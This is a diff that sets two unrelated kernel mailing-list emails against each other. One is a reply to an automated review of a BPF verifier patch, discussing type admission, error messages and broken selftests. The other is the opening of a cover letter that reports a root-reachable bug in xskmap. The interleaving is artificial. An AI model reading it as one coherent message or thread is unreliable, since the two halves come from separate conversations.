@@ -1,484 +1,402 @@
-Received: from mail-oo1-f41.google.com (mail-oo1-f41.google.com [209.85.161.41])
+Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 28ECB3905E7
-	for <bpf@vger.kernel.org>; Thu, 10 Sep 2026 16:18:31 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.161.41
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789057113; cv=pass; b=UISeOV+dUkWnsagEjuRK+zOjhv5iaV9fHn//5fzT+wX4dmxm1yZklz0ZsLLlwnpAup6ljWd26mVlE21Pa0Bg9HP3eZwpEuaC/3oH7to7nU4PPMePFB4O6dEzy3Un0vHUUTUU878KXl4QfJYLwCdeLf1VQD+inkeZIinzv3P70Hk=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789057113; c=relaxed/simple;
-	bh=xPTXmq3IFCSKJnG+AUqMmIcVMPJiq4BgjXiNsbgbQsA=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=avTxSAiJEuBBTZg1GPHOjJQwxoQzAkup71n97qeI4vWOxew6lu7pd3wj55wzwkH7tVr8JzCbKPVkkYTsXtnjIxvR/wHLbQI7cagTstVOpv+4hDtWbNxix1nS+nw8TGWjpgvdPDfmg4sBt87SUgFSM7DA/ZGQhQA35YGfvMyVdvY=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=gbGlYcjH; arc=pass smtp.client-ip=209.85.161.41
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AD1004A2A64
+	for <bpf@vger.kernel.org>; Thu, 10 Sep 2026 16:18:36 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1789057118; cv=none; b=oWf/111JRKvKLN5O6sFuFf+tHAooSB7PF0XBSk8M8/OmdPjRmwzyFn86vTP/ixvoNtEyi87JAp/3K2LGBGpUlSQPlucjD/j9SUM1LVYRuySYoQi56Xcv1Y6Zic07a38Zw0W7mIgngIJxMVa0JJun80EIjh2mXjTSwtKCyA4clak=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1789057118; c=relaxed/simple;
+	bh=TRnznfs1Pc3iuNSbfRs9/7UZhf/zmXUvU2hsIF8roT0=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GbaJGte/mbqMp4b19s1AxkNiDB/OZrwBAvz7hFd0cLCWSskeT0ObZwXSoCydphjzoeveNkbA+k5+bGVxMmqGC14Ob2GzgMlhjoIT8UHy+Eio0HXnEevnSenlLcsb1PIumGAFZg/mk1qCp0ZD00g2yf7UNTZqv6XOTQnq40hO6U4=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=e2Y4TcyR; arc=none smtp.client-ip=74.125.227.140
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="gbGlYcjH"
-Received: by mail-oo1-f41.google.com with SMTP id 006d021491bc7-6bd209cf210so1729651eaf.3
-        for <bpf@vger.kernel.org>; Thu, 10 Sep 2026 09:18:30 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1789057110; cv=none;
-        d=google.com; s=arc-20260327;
-        b=rg3DjlrLEx+AA9prI0vhwZbjSuADZ6mdiQ06H4d/TQsNHSjIDWEX08fjbqJX2im742
-         UxCNQSN/UrtbXmrHMAToFucYSU8ezR8Lhf8//HPkEbkqlajvp4OOC19bZTjfOyqCT3L6
-         PxI16fIPbvo93gP9l79aWUAzl0tr0T15mV9ObEYPvIYI2bkwv/T0IDAnjJzypGoOF8CF
-         ctaK9yVg7l0XR3wZ2tXx7HAMt4kK5nvPjC43FfbrIQ594NByTPmQUIVpOyE05hwv2LOU
-         XTHgO34kVkEX4HEEC4CdfZf/Vhy8rUAMKtka+71PUry1om9I3PGlundpLTNBZTyC8tqR
-         6kag==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=V2OpOIdzqTNwrLTqFon9KD9npArEV/8lWwM0QVbx9Ts=;
-        fh=+iofH7kLhUIpDUAo/a2rUbKulXCH8Go9n65YHAt0kP0=;
-        b=g8/10rEuBr5nJmgVKQsa7INZ2dUS1F99HeTVYEgFsy5QLVa4cr7NQIp+CLxF8UKU0x
-         DvHLtcZIc3U/z3Qd227DxSpAYUm5i65kjbKWZLolTx7Sb9vfZsy2hWv+MkcpUzIWW8O6
-         wssumu+CLY9pi6YtM3l+Zoq95iUpwJyNXE84f71c+7BKWmubBtTufaLHvUCRsfE/NYN2
-         /2TgSD2BkaTP+w9/gV6PBnNagddagiv9Fm+yVSsjkLAkHBmqkQdol63jFFyVyXMZl8ML
-         QrEqmwZCpZC4bs5CqTCgBh/Iq3Fek1SC21XVvqQBGBSkQF7kivs0e+zEtZrzfANGrMdS
-         Rtsg==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="e2Y4TcyR"
+Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-396ccc02279so1484721a91.1
+        for <bpf@vger.kernel.org>; Thu, 10 Sep 2026 09:18:36 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1789057110; x=1789661910; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=V2OpOIdzqTNwrLTqFon9KD9npArEV/8lWwM0QVbx9Ts=;
-        b=gbGlYcjH3xEhkO637S9AeBA3cvuGUfCsy12Uut/aq5ChRqw4bUXNAbTiX9P5WLgy5S
-         /gUkYln6IzzHYeGEDRwy4be6lUS2Xc0wTxojI6O9VWBk8LKHX16WWdjll9OcpToTUHQI
-         c+E365Uh4i+RMW3PjhpawENG69RMjhkO1XkySGv8q6Y3PLH6olMPhc5gK5LKraPRoQXd
-         P2QBwZ1TWkfE840EiP6ax/cYF37dSwHuvgMgYiK9pRhVusC/x02VLdlw9XMv+4J1OomQ
-         QsyOqakFuRVfIKV4aj6tHSVskZdHpVcP9VE1US0dmLmcpe0tAI3rAVjgp6Wd0TWAEA3o
-         0yxg==
+        d=nebusec.ai; s=google; t=1789057116; x=1789661916; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=npapbvURZUJn7dCF72HJkz8R047uORL8VM+rKAaLX80=;
+        b=e2Y4TcyRRVpPoBtcVWEQR29Vb22+XeJmoQ76sJ8Oz6lOb5bE0Y3reWHrfDJyS+d0RL
+         6Sdnu0DKyWiSqceQIaUB8nNqaDjimOR0MO4ZWE8OZes5IexzCp4yKQhxWErA5sFapoHp
+         jSX45rITR7TPXGBAKUqAF8yL3sfvAOhzJ2IH3ay1TMIa8Sjzu8B1hl053jhtIJn6VGAJ
+         71xvC8fGdHxIqrvr1zSXJmz40z0XnEukbA9St1YmmX4fIqGxzxUHkDdsRkUAIa8dIgUQ
+         5t2qDra5cYwYCvUilkqiurF7hr3HiI7dvZ+BQeFTs0VtmpDrO51A3fHpwxSfrWQnxr56
+         YD6A==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1789057110; x=1789661910;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=V2OpOIdzqTNwrLTqFon9KD9npArEV/8lWwM0QVbx9Ts=;
-        b=WFkhT66AD6XDQobtx5yHF0FZZ+CFJzmR6rsFfYRoMYQYum9pBw1CEl9IjG6bxF/5Kg
-         wH71g7pP2w4dFnbzTkYEQzZ08EmGqQaPRCXKIxHvfg2lNiRYxCot4p2RngTItONxBbFS
-         nK00NfA+UToeDR/XKedHeO1c9K3sDAPoA4YE6Kd9CpxUxzNHkX64+UUmLO/YugraruPO
-         MjmVi615GyXzDD3f7C7uNLnq1Rttd/T8WE4ni9fuVUmwFl8TZDoxOLqXEY59w6+e8KzP
-         47FKus6OLIib6P3HqFKA48d3LSgWNKKPpeyiqizy1PDH0V2snvVN7hDGrCTnchTCebeo
-         BJ5g==
-X-Gm-Message-State: AFuF++kEPHq9lGG87kfaziRdnphJlbqm1qo85nvxUjqXwd/9BOap9JsF
-	QDBzkUPp0vVdPQy092pHBdqFJyKF2p1Tkhv1R8ThwxeshIqaB2ynCa+o7C//HKHfh0OA5/OpuCS
-	p1hxrIvu1sSKZVCLp7ATPRYIP59b3yEA=
-X-Gm-Gg: AYBFou2AHSXxUuNoqX5jgGcPiilkX/bBr0eXBSNbO01TvhDTFOOhnFWjX7J5MbHmWxc
-	M8KwcOQt5LFzJefu6EBvWHWK8YFXLMdLADS1LwJUE+djg275IW4JnIN1l3leSOa8zGAsr/VdLdo
-	KCYfFCJuG9jcZDSIhleCVq9KeIJv8WeiEFwvCd13D0kmXuCn1NAk8gvtaoA8ysGBbU2EiuOgWt7
-	Mt96Y1yyDTb01TVlZyIN/hGMd84D/s2ZKMimCj6qkR7p/qBApbgG2FbFlWDHz0oNtwZKSbicswi
-	trTqa6DjvkUuVa/25ER/noU4lCgy7YR1iFWy/WC892mfQDn7aE+ZfeI=
-X-Received: by 2002:a05:6820:80c7:b0:6be:139:c032 with SMTP id
- 006d021491bc7-6be0139d6b2mr6200556eaf.18.1789057109581; Thu, 10 Sep 2026
- 09:18:29 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1789057116; x=1789661916;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=npapbvURZUJn7dCF72HJkz8R047uORL8VM+rKAaLX80=;
+        b=OPQX43D5/aMO+lwcjM5iGkmhPV+vSl76JQ3fMIh9vxf9rwqRPzHq5npv1em4ryU/Ug
+         yMxeGyZiVxmMBKsSwtAqpfKmj7MnP+dy0C9swVc508yL3iMvwXlT4IV1jCTdn94wDus3
+         Vw6asikIbNoxHfbmEWraNCCdbA/L6pXMsehkLjM55qRw8oA4F/HdqYNSKLGgoEWbvZj1
+         w61sFsmHURHXPjMTYOg8YIJ14ch6aXleIECciUIWnlL23VU7l/tIAUjQT6Sn/4bTtTju
+         MeTbduT0W2bmMw5y4DoDMwBJu88gfedfYfRwn9WbQm5TjA8clUUUqkik3RvvUl3UnfRQ
+         y3zg==
+X-Forwarded-Encrypted: i=1; AKwUvByWLnhJiBjfOKOIfkFRWoETHrgvowz18VJXwfFvZYexlzliLsPITLnpfsnVzY1agUBxdDI=@vger.kernel.org
+X-Gm-Message-State: AFuF++mcf0aZnHhy+pn3w7SHOUxp5QI9EfH9GjSTZ8fAJsaraws3Irn2
+	gDphhDR5HhkgZ1j/YfIQBZUp1WV+EydxQKNyaIuhhZkHHe/Rq3vtVTefJIafrIDUX5+w
+X-Gm-Gg: AYBFou2xXLjuNylvKauq3gDBLWAlJEcahYvRzvbgo7juqZ7VbUfCkxEIxg+EErIudhh
+	KHjaXT2QF7X8IVNXrNSP9X9OLOeIS1bB8gYhGhVJ54CcINfck/lKvaG2RGsV0uJwdkedG/gncVx
+	AzxwZ21w+6AYRfjetgrHNuL1MsK7AHt/9rU72Le4olbzOlFgCdI4TTUrpPp0UdtBDhMKqxGQt23
+	zaPD7jUiJ2e2olz1n6rAP/cJdI97xhb50T4CEfgCpO2l3UCYEJm6sUgWOLcUWuLjShGslymtvvt
+	YISv/YK0D7weDzydM3TuXLSswBa2HgqHQH10M5mCPQ0Hn2iby33hJEpSaYPl0sEFISDT4OgrbkN
+	ZVKIFwaUJcOmW61svcHj34N/k/c+7+Tx5SVMwWnekvpUmtqQVv30ym8JBbZ2+rIDzwXbO17+rTu
+	Z/SOiP/Q0b/9xf28OAM5LmOxbuucJl/eW2Cuyq9nx9J8kSKAPoL6yWmjbpfchnjqfvSNnZ2iNFD
+	XLrx+9E
+X-Received: by 2002:a17:90b:4b0e:b0:396:635a:9b10 with SMTP id 98e67ed59e1d1-39d70a159ebmr11326534a91.11.1789057115870;
+        Thu, 10 Sep 2026 09:18:35 -0700 (PDT)
+Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-339770f0489sm24262327eec.8.2026.09.10.09.18.30
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 10 Sep 2026 09:18:35 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: netdev@vger.kernel.org,
+	bpf@vger.kernel.org
+Cc: magnus.karlsson@intel.com,
+	maciej.fijalkowski@intel.com,
+	sdf@fomichev.me,
+	davem@davemloft.net,
+	edumazet@google.com,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	ast@kernel.org,
+	daniel@iogearbox.net,
+	hawk@kernel.org,
+	john.fastabend@gmail.com,
+	jonathan.lemon@gmail.com,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH bpf 0/1] xsk: use a 32-bit compare in xsk_map_gen_lookup
+Date: Fri, 11 Sep 2026 00:18:23 +0800
+Message-ID: <cover.1789056660.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260905220117.922028-19-ameryhung@gmail.com> <58079fda8b9a98ec66a54e8c1cb80e4eaedf82cc5fda7f8cebef10fb1b4e266d@mail.kernel.org>
-In-Reply-To: <58079fda8b9a98ec66a54e8c1cb80e4eaedf82cc5fda7f8cebef10fb1b4e266d@mail.kernel.org>
-From: Amery Hung <ameryhung@gmail.com>
-Date: Thu, 10 Sep 2026 09:18:16 -0700
-X-Gm-Features: AcwNN1WK3TI4nm1oL-zZHhB7pahAGQQBYFeBvP1WQOiLVYbQG2tqKxYyMPdoEAo
-Message-ID: <CAMB2axMiEOPq4x2pe+T-nVPDiPgOsRtTuyZjF3Z2f13vF0TxzA@mail.gmail.com>
-Subject: Re: [PATCH bpf-next v1 18/22] bpf: Admit kfunc argument registers
- through check_reg_type()
-To: bot+bpf-ci@kernel.org
-Cc: bpf@vger.kernel.org, alexei.starovoitov@gmail.com, andrii@kernel.org, 
-	daniel@iogearbox.net, eddyz87@gmail.com, memxor@gmail.com, 
-	kernel-team@meta.com, ast@kernel.org, martin.lau@kernel.org, 
-	yonghong.song@linux.dev, mason@kernel.org, ihor.solodrai@linux.dev
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
 
-On Sat, Sep 5, 2026 at 4:23=E2=80=AFPM <bot+bpf-ci@kernel.org> wrote:
->
-> > diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
-> > index bd3fea62aa02..cad49ea5fdfa 100644
-> > --- a/kernel/bpf/verifier.c
-> > +++ b/kernel/bpf/verifier.c
->
-> [ ... ]
->
-> > @@ -8251,7 +8239,7 @@ static const struct bpf_reg_types mem_types =3D {
-> >       },
-> >  };
-> >
-> > -static const struct bpf_reg_types spin_lock_types =3D {
-> > +static const struct bpf_reg_types map_value_or_alloc_obj_types =3D {
-> >       .types =3D {
-> >               PTR_TO_MAP_VALUE,
-> >               PTR_TO_BTF_ID | MEM_ALLOC,
->
-> [ ... ]
->
-> > @@ -8280,7 +8268,29 @@ static const struct bpf_reg_types percpu_btf_ptr=
-_types =3D {
-> >  static const struct bpf_reg_types func_ptr_types =3D { .types =3D { PT=
-R_TO_FUNC } };
-> >  static const struct bpf_reg_types stack_ptr_types =3D { .types =3D { P=
-TR_TO_STACK } };
-> >  static const struct bpf_reg_types const_str_ptr_types =3D { .types =3D=
- { PTR_TO_MAP_VALUE } };
-> > -static const struct bpf_reg_types timer_types =3D { .types =3D { PTR_T=
-O_MAP_VALUE } };
-> > +static const struct bpf_reg_types map_value_types =3D { .types =3D { P=
-TR_TO_MAP_VALUE } };
-> > +static const struct bpf_reg_types arena_types =3D {
-> > +     .types =3D {
-> > +             PTR_TO_ARENA,
-> > +             SCALAR_VALUE,
-> > +     }
-> > +};
-> > +
-> > +static const struct bpf_reg_types alloc_obj_types =3D {
-> > +     .types =3D {
-> > +             PTR_TO_BTF_ID | MEM_ALLOC,
-> > +             PTR_TO_BTF_ID | MEM_ALLOC | MEM_PERCPU,
-> > +     }
-> > +};
-> > +
-> > +static const struct bpf_reg_types alloc_obj_or_non_own_ref_types =3D {
-> > +     .types =3D {
-> > +             PTR_TO_BTF_ID | MEM_ALLOC,
-> > +             PTR_TO_BTF_ID | MEM_ALLOC | NON_OWN_REF,
-> > +             PTR_TO_BTF_ID | MEM_ALLOC | NON_OWN_REF | MEM_RCU,
-> > +     }
-> > +};
->
-> Does alloc_obj_or_non_own_ref_types need a diagnostic improvement?
-> reg_type_str() has no textual prefix for MEM_ALLOC or NON_OWN_REF and
-> renders PTR_TO_BTF_ID as the bare stem "ptr_". The first two entries both
-> render as "ptr_" and the third as "rcu_ptr_", giving users the
-> non-actionable list "ptr_, ptr_, rcu_ptr_". The selftest updates confirm
-> this is what users see:
->
->   rbtree_fail.c: __msg("R2 type=3Dscalar expected=3Dptr_, ptr_, rcu_ptr_"=
-)
->   refcounted_kptr_fail.c: __msg("R1 type=3Dctx expected=3Dptr_, ptr_, rcu=
-_ptr_")
->
-> These replace specific messages like "R1 is neither owning or non-owning
-> ref". The changelog claims "The reason continues to report the actual
-> register type and all accepted register types", which is literally true b=
-ut
-> not useful here: three distinct ownership states collapse to two
-> indistinguishable strings, and "ptr_" is a dangling stem. Either
-> reg_type_str() needs prefixes for MEM_ALLOC/NON_OWN_REF, or
-> ARG_PTR_TO_REFCOUNTED_KPTR / ARG_PTR_TO_LIST_NODE / ARG_PTR_TO_RB_NODE
-> should keep an ownership-specific message.
->
-> > @@ -8310,16 +8320,32 @@ static const struct bpf_reg_types *compatible_r=
-eg_types[__BPF_ARG_TYPE_MAX] =3D {
-> >  #endif
-> >       [ARG_PTR_TO_SOCKET]             =3D &fullsock_types,
-> >       [ARG_PTR_TO_BTF_ID]             =3D &btf_ptr_types,
-> > -     [ARG_PTR_TO_SPIN_LOCK]          =3D &spin_lock_types,
-> > +     [ARG_PTR_TO_SPIN_LOCK]          =3D &map_value_or_alloc_obj_types=
-,
-> >       [ARG_PTR_TO_MEM]                =3D &mem_types,
-> >       [ARG_PTR_TO_RINGBUF_MEM]        =3D &ringbuf_mem_types,
-> >       [ARG_PTR_TO_PERCPU_BTF_ID]      =3D &percpu_btf_ptr_types,
-> >       [ARG_PTR_TO_FUNC]               =3D &func_ptr_types,
-> >       [ARG_PTR_TO_STACK]              =3D &stack_ptr_types,
-> >       [ARG_PTR_TO_CONST_STR]          =3D &const_str_ptr_types,
-> > -     [ARG_PTR_TO_TIMER]              =3D &timer_types,
-> > +     [ARG_PTR_TO_TIMER]              =3D &map_value_types,
-> >       [ARG_KPTR_XCHG_DEST]            =3D &kptr_xchg_dest_types,
-> >       [ARG_PTR_TO_DYNPTR]             =3D &dynptr_types,
-> > +     /* Argument kinds only a kfunc can have. */
-> > +     [ARG_SCALAR]                    =3D &scalar_types,
-> > +     [ARG_CONST_SCALAR]              =3D &scalar_types,
-> > +     [ARG_CONST_MEM_SIZE]            =3D &scalar_types,
-> > +     [ARG_PTR_TO_ALLOC_BTF_ID]       =3D &alloc_obj_types,
-> > +     [ARG_PTR_TO_REFCOUNTED_KPTR]    =3D &alloc_obj_or_non_own_ref_typ=
-es,
-> > +     [ARG_PTR_TO_ITER]               =3D &stack_ptr_types,
-> > +     [ARG_PTR_TO_LIST_HEAD]          =3D &map_value_or_alloc_obj_types=
-,
-> > +     [ARG_PTR_TO_LIST_NODE]          =3D &alloc_obj_or_non_own_ref_typ=
-es,
-> > +     [ARG_PTR_TO_RB_ROOT]            =3D &map_value_or_alloc_obj_types=
-,
-> > +     [ARG_PTR_TO_RB_NODE]            =3D &alloc_obj_or_non_own_ref_typ=
-es,
-> > +     [ARG_PTR_TO_RES_SPIN_LOCK]      =3D &map_value_or_alloc_obj_types=
-,
-> > +     [ARG_PTR_TO_WORKQUEUE]          =3D &map_value_types,
-> > +     [ARG_PTR_TO_TASK_WORK]          =3D &map_value_types,
-> > +     [ARG_PTR_TO_IRQ_FLAG]           =3D &stack_ptr_types,
-> > +     [ARG_PTR_TO_ARENA]              =3D &arena_types,
-> >  };
->
-> Does ARG_PTR_TO_MEM need to admit allocated objects for kfuncs? Running
+Hi Linux kernel maintainers,
 
-This seems to be a real regression. Since helper currently does not
-allow it (wether relaxing it or not can be defer), I will add a
-shortcut in check_reg_type to allow this instead of adding
-PTR_TO_BTF_ID | MEM_ALLOC to mem_types.
+We found and validated an issue in net/xdp/xskmap.c. The bug is
+reachable by a root user.
 
-> check_reg_type() on kfunc arguments makes mem_types the admission gate fo=
-r
-> ARG_PTR_TO_MEM, but mem_types lists only PTR_TO_BTF_ID | PTR_TRUSTED amon=
-g
-> the BTF-backed register types. Before this commit check_kfunc_args() had =
-no
-> reg-type test in its ARG_PTR_TO_MEM / ARG_MEM_SIZE cases (the commit
-> removes tests from ten other cases but adds none here), so a kfunc memory
-> argument was validated only by check_mem_reg()/check_mem_size_reg() ->
-> check_helper_mem_access(), which accepts any BTF-ID register:
->
->   case PTR_TO_BTF_ID:
->     return check_ptr_to_btf_access(env, regs, reg, argno, 0,
->                                    access_size, access_type, -1);
->     /* kernel/bpf/verifier.c:7097-7099, switch is on base_type(reg->type)=
- */
->
-> Kfunc memory arguments are checked with BPF_READ | BPF_WRITE
-> (verifier.c:13243 and 13289), and check_ptr_to_btf_access() has an explic=
-it
-> carve-out that permits exactly those writes for BPF-allocated objects:
->
->   /* Writes are permitted with default btf_struct_access for
->    * program allocated objects (which always have id > 0).
->    */
->   if (atype !=3D BPF_READ && !type_is_ptr_alloc_obj(reg->type)) {
->     verbose(env, "only read is supported\n");
->     return -EACCES;
->   }
->   /* kernel/bpf/verifier.c:6093-6099 */
->
-> check_func_arg_reg_off() likewise enumerates PTR_TO_BTF_ID | MEM_ALLOC an=
-d
-> PTR_TO_BTF_ID | MEM_ALLOC | NON_OWN_REF as register types that legitimate=
-ly
-> reach argument checking with a fixed offset (verifier.c:8567-8578). So a
-> program that does
->
->   struct foo *f =3D bpf_obj_new(typeof(*f));
->   ...
->   some_kfunc(&f->buf, sizeof(f->buf));  /* void *p, u32 p__sz */
->
-> or passes such a pointer to a fixed-size scalar-pointer kfunc argument
-> (get_kfunc_arg_type() verifier.c:12321, ARG_PTR_TO_MEM | MEM_FIXED_SIZE)
-> loaded before this commit and is now rejected at check_reg_type() with
-> -EACCES: "R1 type=3Dptr_ expected=3Dfp, pkt, pkt_meta, map_key, map_value=
-, mem,
-> ringbuf_mem, buf, trusted_ptr_, ctx".
->
-> Since mem_types already excluded PTR_TO_BTF_ID | MEM_ALLOC for helpers, t=
-he
-> write-to-allocated-object carve-out in check_ptr_to_btf_access() was
-> reachable from the argument path only through kfuncs; after this commit i=
-t
-> is unreachable from any argument path.
->
-> This is a third, undocumented behaviour change. The changelog states "Two
-> behavior changes fall out of running admission first" and lists only the
-> ARG_CONST_MEM_SIZE precision fix and the ARG_CONST_MAP_PTR
-> type_may_be_null() removal. No selftest covers passing an allocated objec=
-t
-> as a kfunc memory argument, so the capability is removed silently. Forwar=
-d
-> search over the supplied range 8f65640265e8..a490f49b0c4e shows no change
-> to mem_types. If the narrowing is intended it should be stated in the
-> changelog (and the now-dead carve-out comment in check_ptr_to_btf_access(=
-)
-> updated); otherwise mem_types needs PTR_TO_BTF_ID | MEM_ALLOC (and the
-> NON_OWN_REF form).
->
-> [ ... ]
->
-> > @@ -13002,25 +13015,20 @@ static int check_kfunc_args(struct bpf_verifi=
-er_env *env, struct bpf_call_arg_me
-> >               if (base_type(arg_type) =3D=3D ARG_PTR_TO_BTF_ID)
-> >                       ref_id =3D *meta->fn->arg_btf_id[i];
-> >
-> > -             ret =3D resolve_func_arg_type(env, reg, i, meta, insn_idx=
-, &arg_type, &arg_size);
-> > +             ret =3D resolve_func_arg_type(env, reg, i, meta, &arg_typ=
-e, &arg_size);
-> >               if (ret < 0)
-> >                       return ret;
-> > +
-> > +             ret =3D check_reg_type(env, reg, argno, arg_type, meta);
-> > +             if (ret < 0)
-> > +                     return ret;
-> > +
-> >               ret =3D check_func_arg_reg_off(env, reg, argno, arg_type)=
-;
-> >               if (ret < 0)
-> >                       return ret;
-> >
-> >               switch (base_type(arg_type)) {
-> >               case ARG_CONST_SCALAR:
-> > -                     if (reg->type !=3D SCALAR_VALUE) {
-> > -                             verbose(env, "%s is not a scalar\n", reg_=
-arg_name(env, argno));
-> > -                             bpf_diag_call_arg_fmt(env, insn_idx, argn=
-o, func_name,
-> > -                                                   "Pass an integer sc=
-alar value for this argument, not a pointer or resource object.",
-> > -                                                   "the kfunc expects =
-an integer scalar, but %s is %s",
-> > -                                                   reg_arg_name(env, a=
-rgno),
-> > -                                                   bpf_diag_reg_type_p=
-lain(env, reg->type));
-> > -                             return -EINVAL;
-> > -                     }
-> > -
-> >                       ret =3D process_const_arg(env, reg, argno, meta);
-> >                       if (ret < 0) {
-> >                               if (ret =3D=3D -EINVAL)
->
-> [ ... ]
->
-> > @@ -11845,24 +11874,8 @@ static int resolve_func_arg_type(struct bpf_ve=
-rifier_env *env,
-> >               ref_t =3D btf_type_skip_modifiers(btf, ref_id, &ref_id);
-> >               ref_tname =3D btf_name_by_offset(btf, ref_t->name_off);
-> >
-> > -             if (!btf_type_is_scalar_struct(env, btf, ref_t)) {
-> > -                     enum bpf_reg_type reg2btf_type =3D lookup_reg2btf=
-_ids(ref_id);
-> > -                     const char *expected_type;
-> > -
-> > -                     verbose(env, "%s is %s expected %s %s",
-> > -                             reg_arg_name(env, argno), reg_type_str(en=
-v, reg->type),
-> > -                             btf_type_str(ref_t), ref_tname);
-> > -                     if (reg2btf_type !=3D NOT_INIT)
-> > -                             verbose(env, " or %s", reg_type_str(env, =
-reg2btf_type));
-> > -                     verbose(env, "\n");
-> > -                     expected_type =3D bpf_diag_fmt_btf_type(env, btf,=
- ref_id);
-> > -                     bpf_diag_call_arg_fmt(env, insn_idx, argno, meta-=
->func_name,
-> > -                                           "Pass a verifier-tracked po=
-inter to the expected kernel object type, not a pointer to stack storage or=
- another memory buffer.",
-> > -                                           "the function expects a poi=
-nter to %s, but this argument is %s and cannot be used as that kernel objec=
-t pointer",
-> > -                                           expected_type,
-> > -                                           bpf_diag_reg_type_plain(env=
-, reg->type));
-> > -                     return -EINVAL;
-> > -             }
-> > +             if (!btf_type_is_scalar_struct(env, btf, ref_t))
-> > +                     return 0;
->
-> Does this break existing selftests? The patch deletes the only producer o=
-f
-> the "R1 is fp expected STRUCT prog_test_fail1" diagnostic from
-> resolve_func_arg_type(), replacing it with a bare `return 0;`. It updates
-> verifier/calls.c line 79 but leaves three other cases in the same file
-> still asserting the removed message:
->
->   calls.c:34  .errstr =3D "R1 is fp expected STRUCT prog_test_fail1"
->   calls.c:49  .errstr =3D "max struct nesting depth exceeded\nR1 is fp
->                expected STRUCT prog_test_fail2"
->   calls.c:64  .errstr =3D "R1 is fp expected STRUCT prog_test_fail3"
->
-> All three are reached: bpf_kfunc_call_test_fail1/2/3 take pointers to
-> struct prog_test_fail1 (has pointer member), prog_test_fail2 (nesting dep=
-th
-> > 4) and prog_test_fail3 (flexible array), so btf_type_is_scalar_struct()
-> returns false for each and the removed verbose() used to fire. After the
-> patch, resolve_func_arg_type() returns 0 with arg_type still
-> ARG_PTR_TO_BTF_ID; check_reg_type() then rejects R1 (PTR_TO_STACK) agains=
-t
-> btf_ptr_types and prints "R1 type=3Dfp expected=3Dptr_, trusted_ptr_, rcu=
-_ptr_"
-> instead. The asserted substrings never appear, so these three test_verifi=
-er
-> cases fail.
->
